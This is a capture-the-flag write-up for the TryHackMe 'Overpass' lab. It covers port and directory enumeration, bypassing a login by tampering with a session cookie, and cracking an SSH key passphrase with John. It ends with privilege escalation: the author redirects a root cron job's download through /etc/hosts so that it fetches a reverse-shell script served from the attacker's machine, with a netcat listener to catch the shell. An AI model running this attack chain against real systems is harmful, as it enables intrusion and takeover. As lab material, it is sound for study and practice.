OVERPASS:THM
First pass it was to do a Nmap scan of the all ports with the command:

        nmap -p- overpass.thm

it had the ports 22 and 80 open.
after the nmap I run the gobuster to do a directory's enum:
 
        gobuster dir -u http://overpass.thm -w /usr/share/wordlists/dirbuster/medium.txt

The results are several but the most important was the /admin.
Ctrl+u to see the HTML code, in the code there was a script that it does the client-side controll
with the cookie session, so in the dev tools, storage i did the cookie tampering in order to access 
in the login

the name that it was altered it was statuscookie.

once I was entering I could obtain the RSA private key for the SSH, with the command:

        ssh -i james.key james@overpass.thm

I tried to access but there was a passphrase to crack, that it was  in the private key, in order to crack
I will do John but before I must convert the RSA private key in a hash:

        ssh2john james.key
        /Hash result/
        john james.hash
        passwd: james13

So after that I enter in the account and i did a priviliege escalation with linpeash.sh

        python3 -m http.server 80 (in my machine)
        curl "http://10.10.10.10:80/linpeash.sh > linpeash.sh" (in the james account)

Then after run linpeas.sh it found a vuln in the chrontab that it runs a BuildScript.sh every minute.
we must use for priviliege escalation.
First of all I modiefied /etc/hosts (The internal DNS) i add my ip and the overpass.thm in order to decieve
the Curl in the crontab.
Then in my desktop I add two folder /downloads/src and inside /src i add a Buildscript.sh with a reverse shell
bin -i inside with my ip address and the port 4444.

        nc -lnvp 4444 (socket in listening at the port 4444)
        in the /desktop i run Pyhton3 -m http.server 80

Finaly I got a reverse shell and take the flag.
          
